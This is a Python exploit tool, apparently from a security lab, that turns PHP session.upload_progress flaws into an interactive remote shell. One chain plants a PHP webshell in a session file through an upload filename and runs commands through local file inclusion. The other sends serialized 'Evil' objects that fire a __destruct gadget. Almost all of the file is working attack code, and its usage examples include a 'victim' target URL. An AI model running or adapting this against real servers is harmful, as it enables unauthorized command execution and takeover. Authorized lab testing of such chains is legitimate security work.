#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = []
# ///
"""Interactive pseudo-shell over the PHP session.upload_progress RCE chains.

A read-execute loop: you type a command, it is delivered through the
selected chain, and the output is printed. Type `exit` (or Ctrl-D) to leave.

Chains:
  a   session injection + LFI. One-shot injection of a tiny PHP webshell
      into the session file (system($_GET['c'])); every command is then a
      plain GET with ?c=<cmd>. Works over plain HTTP — no docker needed.
  c   handler mismatch -> __destruct. Each command is re-delivered as a
      fresh serialized Evil object (write via the php_serialize dir, trigger
      via the php dir). Output is echoed by the read endpoint (lab default)
      or fetched with `docker exec` when --docker is given.

  (chain B is a local memory-corruption primitive, not a persistent channel
   — it stays one-shot in poc_chain_b.sh.)

Examples:
  uv run rce_shell.py --chain a
  uv run rce_shell.py --chain c --docker p2s2-lab
  uv run rce_shell.py --chain a --target https://victim.example \
      --lfi-path /vuln.php --save-path /var/lib/php/sessions

For authorized testing only.
"""
import argparse
import os
import socket
import ssl
import subprocess
import sys
import time
from urllib.parse import urlparse, quote

B = "RCESHELL"


def send(host, port, method, path, body=b"", headers="", scheme="http"):
    hdr = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n{headers}\r\n").encode()
    sock = socket.create_connection((host, port), timeout=15)
    if scheme == "https":
        sock = ssl.create_default_context().wrap_socket(sock, server_hostname=host)
    sock.sendall(hdr + body)
    sock.settimeout(10)
    resp = b""
    while True:
        try:
            d = sock.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    sock.close()
    return resp


def multipart(host, port, path, sid, progress, filename, scheme):
    body = (
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{progress}\r\n'
        f"--{B}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\n'
        f"Z\r\n"
        f"--{B}--\r\n"
    ).encode("latin-1")
    return send(host, port, "POST", path, body,
                f"Content-Type: multipart/form-data; boundary={B}\r\n", scheme)


def extract(resp: bytes, start: str, end: str) -> str:
    body = resp.partition(b"\r\n\r\n")[2].decode("latin-1", "replace")
    i, j = body.find(start), body.find(end)
    if i == -1 or j == -1 or j <= i:
        return ""
    return body[i + len(start):j].strip("\r\n")


def docker_exec(container, cmd):
    r = subprocess.run(["docker", "exec", container, "bash", "-c", cmd],
                       capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


def shell_chain_a(args, scheme, host, port):
    sid = args.sid or "chaina" + os.urandom(12).hex()
    sess_file = f"{args.save_path}/sess_{sid}"
    # Webshell goes into the multipart filename: single quotes ONLY
    # (filenames truncate at the first embedded double quote).
    # Markers are assembled at runtime ('=='.'OUT'.'==') so the literal
    # marker never appears in the echoed session-file source prefix.
    payload = ("<?php echo PHP_EOL,'=='.'OUT'.'==',PHP_EOL;"
               "system($_GET['c']);"
               "echo PHP_EOL,'=='.'END'.'==',PHP_EOL;?>")
    print(f"[*] Chain A pseudo-shell — target {scheme}://{host}:{port}")
    print(f"[*] injecting webshell via session file {sess_file} ...")
    r = multipart(host, port, args.write_path, sid, "x", payload, scheme)
    if not r.startswith(b"HTTP/1.1 200"):
        status = r.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        print(f"[-] injection failed: {status}")
        sys.exit(1)
    print(f"[+] injected. Every command is now GET {args.lfi_path}?{args.lfi_param}=<sessfile>&c=<cmd>")
    print("[*] type commands; 'exit' or Ctrl-D to quit\n")
    while True:
        try:
            cmd = input("rce$ ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] bye")
            break
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            break
        resp = send(host, port, "GET",
                    f"{args.lfi_path}?{args.lfi_param}={quote(sess_file)}&c={quote(cmd)}",
                    scheme=scheme)
        out = extract(resp, "==OUT==", "==END==")
        print(out if out else "(no output)")


def shell_chain_c(args, scheme, host, port):
    sid = args.sid or "chainc" + os.urandom(12).hex()
    print(f"[*] Chain C pseudo-shell — target {scheme}://{host}:{port}")
    print(f"[*] per command: write Evil object via {args.write_path}, "
          f"trigger mismatch via {args.read_path}")
    print("[*] type commands; 'exit' or Ctrl-D to quit\n")
    while True:
        try:
            cmd = input("rce$ ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] bye")
            break
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            break
        if "\r" in cmd or "\n" in cmd:
            print("(single-line commands only)"); continue
        cmd_bytes = cmd.encode("latin-1", "replace")
        gadget = (f'AAA|O:4:"Evil":1:{{s:3:"cmd";s:{len(cmd_bytes)}:"'.encode("latin-1")
                  + cmd_bytes + b'";}')
        multipart(host, port, args.write_path, sid,
                  gadget.decode("latin-1"), "normal.txt", scheme)
        resp = multipart(host, port, args.read_path, sid, "x", "normal.txt", scheme)
        out = extract(resp, "==PROOF==", "==/PROOF==")
        if out:
            print(out)
        elif args.docker:
            time.sleep(0.5)
            out = docker_exec(args.docker, f"cat {args.output_path} 2>/dev/null")
            docker_exec(args.docker, f"rm -f {args.output_path}")
            print(out if out else "(no output)")
        else:
            print("(no output — the read endpoint must echo the proof file; "
                  "use --docker on the lab)")


def main():
    ap = argparse.ArgumentParser(description="Interactive pseudo-shell over the upload-progress RCE chains")
    ap.add_argument("--chain", choices=["a", "c"], required=True)
    ap.add_argument("--target", default="http://127.0.0.1:18081")
    ap.add_argument("--write-path", default=None,
                    help="upload endpoint (default: /chainA/index.php or /chainW/up.php)")
    ap.add_argument("--read-path", default="/chainR/up.php", help="Chain C trigger endpoint")
    ap.add_argument("--lfi-path", default="/chainA/lfi.php", help="Chain A LFI endpoint")
    ap.add_argument("--lfi-param", default="page", help="Chain A LFI GET parameter")
    ap.add_argument("--save-path", default="/tmp/sess", help="target's session.save_path")
    ap.add_argument("--output-path", default="/tmp/rce_proof", help="Chain C proof file (docker mode)")
    ap.add_argument("--docker", metavar="CONTAINER", help="fetch Chain C output via docker exec")
    ap.add_argument("--sid", help="session id (default: random)")
    args = ap.parse_args()

    if args.chain == "a" and args.write_path is None:
        args.write_path = "/chainA/index.php"
    if args.chain == "c" and args.write_path is None:
        args.write_path = "/chainW/up.php"

    u = urlparse(args.target)
    scheme = u.scheme or "http"
    host, port = u.hostname, u.port or (443 if scheme == "https" else 80)

    (shell_chain_a if args.chain == "a" else shell_chain_c)(args, scheme, host, port)


if __name__ == "__main__":
    main()
